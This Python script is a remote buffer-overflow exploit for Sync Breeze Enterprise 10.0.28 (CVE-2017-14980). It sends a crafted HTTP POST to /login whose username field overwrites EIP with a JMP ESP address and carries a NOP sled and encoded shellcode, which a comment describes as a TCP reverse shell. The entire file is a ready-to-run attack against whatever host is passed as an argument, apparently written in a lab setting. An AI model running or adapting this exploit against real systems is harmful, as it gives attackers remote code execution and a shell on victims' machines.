#!/usr/bin/python
# Sync Breeze Enterprise v10.0.28 (CVE-2017-14980)
# Remote buffer overflow in Sync Breeze Enterprise 10.0.28 allows remote attackers to have unspecified impact via a long username parameter to /login.

import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" #JMP ESP opcode (0xff 0xe4) - address 0x10090c83 (little Endian)
  offset = b"C" * 4
  nops = b"\x90" * 10 # nop sled

  # TCP reverse shell
  shellcode = (
        b"\xd9\xc2\xb8\xd4\xc2\xd4\x1c\xd9\x74\x24\xf4\x5b\x31\xc9"
        b"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x97\xd1\x36\xe9\xeb"
        b"\x3e\x34\x12\x13\xbf\x59\x9a\xf6\x8e\x59\xf8\x73\xa0\x69"
        b"\x8a\xd1\x4d\x01\xde\xc1\xc6\x67\xf7\xe6\x6f\xcd\x21\xc9"
        b"\x70\x7e\x11\x48\xf3\x7d\x46\xaa\xca\x4d\x9b\xab\x0b\xb3"
        b"\x56\xf9\xc4\xbf\xc5\xed\x61\xf5\xd5\x86\x3a\x1b\x5e\x7b"
        b"\x8a\x1a\x4f\x2a\x80\x44\x4f\xcd\x45\xfd\xc6\xd5\x8a\x38"
        b"\x90\x6e\x78\xb6\x23\xa6\xb0\x37\x8f\x87\x7c\xca\xd1\xc0"
        b"\xbb\x35\xa4\x38\xb8\xc8\xbf\xff\xc2\x16\x35\x1b\x64\xdc"
        b"\xed\xc7\x94\x31\x6b\x8c\x9b\xfe\xff\xca\xbf\x01\xd3\x61"
        b"\xbb\x8a\xd2\xa5\x4d\xc8\xf0\x61\x15\x8a\x99\x30\xf3\x7d"
        b"\xa5\x22\x5c\x21\x03\x29\x71\x36\x3e\x70\x1e\xfb\x73\x8a"
        b"\xde\x93\x04\xf9\xec\x3c\xbf\x95\x5c\xb4\x19\x62\xa2\xef"
        b"\xde\xfc\x5d\x10\x1f\xd5\x99\x44\x4f\x4d\x0b\xe5\x04\x8d"
        b"\xb4\x30\x8a\xdd\x1a\xeb\x6b\x8d\xda\x5b\x04\xc7\xd4\x84"
        b"\x34\xe8\x3e\xad\xdf\x13\xa9\x12\xb7\x36\x80\xfb\xca\x48"
        b"\xd3\x40\x43\xae\xb9\xa6\x02\x79\x56\x5e\x0f\xf1\xc7\x9f"
        b"\x85\x7c\xc7\x14\x2a\x81\x86\xdc\x47\x91\x7f\x2d\x12\xcb"
        b"\xd6\x32\x88\x63\xb4\xa1\x57\x73\xb3\xd9\xcf\x24\x94\x2c"
        b"\x06\xa0\x08\x16\xb0\xd6\xd0\xce\xfb\x52\x0f\x33\x05\x5b"
        b"\xc2\x0f\x21\x4b\x1a\x8f\x6d\x3f\xf2\xc6\x3b\xe9\xb4\xb0"
        b"\x8d\x43\x6f\x6e\x44\x03\xf6\x5c\x57\x55\xf7\x88\x21\xb9"
        b"\x46\x65\x74\xc6\x67\xe1\x70\xbf\x95\x91\x7f\x6a\x1e\xa1"
        b"\x35\x36\x37\x2a\x90\xa3\x05\x37\x23\x1e\x49\x4e\xa0\xaa"
        b"\x32\xb5\xb8\xdf\x37\xf1\x7e\x0c\x4a\x6a\xeb\x32\xf9\x8b"
        b"\x3e") 

  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
